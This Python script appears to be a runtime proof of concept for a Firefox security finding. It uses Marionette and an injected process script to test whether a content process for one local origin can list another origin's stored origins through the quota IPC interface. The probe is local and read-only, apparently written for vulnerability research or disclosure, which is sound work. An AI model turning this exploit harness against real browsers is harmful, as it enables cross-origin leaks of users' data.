#!/usr/bin/env python3
"""
Runtime proof for finding 08: PQuota::ListOrigins has no TrustParams() gate.

Shows a CONTENT process for origin A enumerating origin B's stored origins.
READ-ONLY. Never calls clearStorage().

Origin A = http://127.0.0.1:PORT   (where the probe runs)
Origin B = http://127.0.0.2:PORT   (seeded with IndexedDB + localStorage)
Different hosts => different origins => different content processes under Fission.
"""
import http.server, json, os, socket, subprocess, sys, threading, time, shutil, signal

HERE   = os.path.dirname(os.path.abspath(__file__))
SP     = os.path.dirname(HERE)
FF_BIN = os.environ.get("FF_BIN", "/path/to/firefox-153.0.1/firefox")
PORT   = 9410
MPORT  = 2828
PROFILE = "/tmp/qprobe-profile"

SEED = b"""<!doctype html><meta charset=utf-8><title>seed</title><script>
localStorage.setItem('snox','B');
const r = indexedDB.open('snoxdb',1);
r.onupgradeneeded = e => e.target.result.createObjectStore('s');
r.onsuccess = e => { document.title = 'SEEDED'; };
</script>seed page"""

PROBEPAGE = b"""<!doctype html><meta charset=utf-8><title>probe</title>
<script>localStorage.setItem('snox','A');</script>probe page"""


class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def do_GET(self):
        body = SEED if self.path.startswith("/seed") else PROBEPAGE
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


class Marionette:
    def __init__(self, host="127.0.0.1", port=MPORT, timeout=120):
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.settimeout(timeout)
        self.buf = b""
        self.msgid = 0
        self._read()

    def _read(self):
        while b":" not in self.buf:
            c = self.sock.recv(65536)
            if not c:
                raise IOError("closed")
            self.buf += c
        ln, _, rest = self.buf.partition(b":")
        n = int(ln)
        while len(rest) < n:
            c = self.sock.recv(65536)
            if not c:
                raise IOError("closed")
            rest += c
        self.buf = rest[n:]
        return json.loads(rest[:n])

    def cmd(self, name, params=None):
        self.msgid += 1
        raw = json.dumps([0, self.msgid, name, params or {}]).encode()
        self.sock.sendall(str(len(raw)).encode() + b":" + raw)
        while True:
            m = self._read()
            if m[0] == 1 and m[1] == self.msgid:
                if m[2]:
                    raise RuntimeError(f"{name} -> {m[2]}")
                return m[3]


def main():
    if not os.path.exists(FF_BIN):
        sys.exit(f"set FF_BIN (env var or edit this file) - not found: {FF_BIN}")
    srv = http.server.ThreadingHTTPServer(("0.0.0.0", PORT), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    print(f"listener on 0.0.0.0:{PORT}")

    shutil.rmtree(PROFILE, ignore_errors=True)
    os.makedirs(PROFILE, exist_ok=True)
    with open(os.path.join(PROFILE, "user.js"), "w") as f:
        f.write(
            'user_pref("marionette.enabled", true);\n'
            'user_pref("remote.active-protocols", 2);\n'
            'user_pref("browser.shell.checkDefaultBrowser", false);\n'
            'user_pref("fission.autostart", true);\n'
            'user_pref("dom.storage.next_gen", true);\n'
            'user_pref("datareporting.policy.dataSubmissionEnabled", false);\n'
        )
    proc = subprocess.Popen(
        [FF_BIN, "--marionette", "--no-remote", "-remote-allow-system-access",
         "--profile", PROFILE, f"http://127.0.0.2:{PORT}/seed"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        preexec_fn=os.setsid,
    )
    try:
        for _ in range(60):
            try:
                m = Marionette(); break
            except OSError:
                time.sleep(1)
        else:
            raise SystemExit("marionette never came up")
        m.cmd("WebDriver:NewSession", {"capabilities": {}})

        # ---- seed origin B ----
        m.cmd("WebDriver:Navigate", {"url": f"http://127.0.0.2:{PORT}/seed"})
        time.sleep(3)
        print(f"seeded origin B = http://127.0.0.2:{PORT} (localStorage + IndexedDB)")

        # ---- keep B alive in this tab, open A in a SECOND tab ----
        m.cmd("WebDriver:NewWindow", {"type": "tab"})
        handles = m.cmd("WebDriver:GetWindowHandles")
        hs = handles["value"] if isinstance(handles, dict) else handles
        m.cmd("WebDriver:SwitchToWindow", {"handle": hs[-1]})
        m.cmd("WebDriver:Navigate", {"url": f"http://127.0.0.1:{PORT}/probe"})
        time.sleep(3)
        print(f"origin A live in tab 2 = http://127.0.0.1:{PORT} "
              f"(origin B still live in tab 1)")

        # ---- register actor + run probe IN THE CONTENT PROCESS ----
        m.cmd("Marionette:SetContext", {"value": "chrome"})
        m.cmd("WebDriver:SetTimeouts", {"script": 60000})
        # NOTE: a file:// process script never reaches content processes (Linux
        # content sandbox blocks the read). A data: URL needs no filesystem access.
        import urllib.parse
        _js = open(os.path.join(HERE, "procscript.js")).read()
        ps = "data:application/javascript;charset=utf-8," + urllib.parse.quote(_js)
        script = """
          const ps   = arguments[0];
          const done = arguments[arguments.length - 1];
          const results = [];
          const listener = {
            receiveMessage(m) { results.push(m.data); },
          };
          try {
            Services.ppmm.addMessageListener("snox:result", listener);
            Services.ppmm.loadProcessScript(ps, true);
          } catch (e) {
            done(JSON.stringify([{ harnessErr: String(e) }]));
            return;
          }
          setTimeout(() => {
            try { Services.ppmm.removeMessageListener("snox:result", listener); } catch (e) {}
            try { Services.ppmm.removeDelayedProcessScript(ps); } catch (e) {}
            done(JSON.stringify(results));
          }, 25000);
        """
        raw = m.cmd("WebDriver:ExecuteAsyncScript",
                    {"script": script, "args": [ps], "sandbox": None})
        allres = json.loads(raw["value"] if isinstance(raw, dict) and "value" in raw else raw)
        b = f"http://127.0.0.2:{PORT}"

        print("\n" + "=" * 74)
        print(f"process scripts reported from {len(allres)} process(es)\n")
        confirmed = False
        for r in allres:
            if "harnessErr" in r:
                print(f"  HARNESS ERROR: {r['harnessErr']}")
                continue
            tag = "PARENT " if r.get("isParent") else "CONTENT"
            ph = r.get("phase")
            origins = r.get("origins") or []
            print(f"  [{tag}] pid={r.get('pid')} remoteType={r.get('remoteType')!r} "
                  f"processType={r.get('processType')} phase={ph}")
            if "err" in r:
                print(f"      listOrigins threw: {r['err']}")
            if "readErr" in r:
                print(f"      result read error: {r['readErr']}")
            print(f"      origins returned: {len(origins)}")
            for o in origins:
                print(f"        {o}")
            if not r.get("isParent") and any("127.0.0.2" in str(o) for o in origins):
                confirmed = True

        print("=" * 74)
        if confirmed:
            print(f"CONFIRMED - a CONTENT process enumerated origin B ({b}).")
            print("  PQuota::RecvListOrigins has no TrustParams() gate; the parent")
            print("  answered a content-process caller with profile-wide origin data.")
        else:
            print("NOT CONFIRMED from a content process - see per-process output above.")
        print("=" * 74)
    finally:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        except Exception:
            pass
        for _ in range(20):
            if proc.poll() is not None:
                break
            time.sleep(0.5)
        srv.shutdown()


if __name__ == "__main__":
    main()
